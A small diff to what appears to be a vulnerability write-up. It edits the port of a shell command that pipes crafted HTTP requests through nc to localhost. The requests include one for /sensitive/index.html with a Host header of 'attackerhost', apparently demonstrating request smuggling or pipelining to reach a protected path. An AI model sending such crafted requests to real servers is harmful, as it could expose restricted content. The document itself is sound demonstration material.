@@ -46,7 +46,7 @@ printf 'GET /a HTTP/1.1\r\n'\
 'GET /sensitive/index.html HTTP/1.1\r\n'\
 'Host: attackerhost\r\n'\
 '\r\n'\
-|nc 127.0.0.1 9015
+|nc 127.0.0.1 9095
 ```
 
  ###  you will get two responses as following.
